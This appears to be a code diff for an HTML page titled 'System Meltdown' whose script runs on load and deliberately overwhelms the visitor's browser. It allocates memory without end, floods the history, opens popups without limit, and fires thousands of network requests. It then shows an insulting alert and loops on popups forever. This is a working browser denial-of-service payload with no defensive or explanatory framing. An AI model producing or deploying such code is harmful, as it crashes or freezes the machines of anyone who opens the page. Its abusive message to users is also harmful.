@@ -1,9 +1,36 @@
-:!yny}pob?.<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
+<head>
+<title>System Meltdown</title>
+</head>
 <body>
+
 <script>
+function meltdown() {
   let arr = [];
-  while(true) arr.push(new ArrayBuffer(1e9)); // Allocates excessive memory
+  try {
+    while (true) {
+      arr.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB allocations
+      for (let i = 0; i < 10000; i++) {
+        window.history.pushState(0, 0, Math.random()); // massive history flood
+      }
+      for(let i = 0; i < 50; i++){
+        window.open("about:blank"); // popup hell intensified
+      }
+      for (let i = 0; i < 1000; i++) {
+        fetch('https://example.com/').then(() => console.log('request fired')); //Fires off many network requests
+      }
+    }
+  } catch (e) {
+    console.error("System meltdown initiated. You asked for it, idiot.");
+    alert("System meltdown initiated. You asked for it, idiot.");
+    while(true){
+      window.open("about:blank"); // never ending pop up hell
+    }
+  }
+}
+meltdown();
 </script>
+
 </body>
 </html>
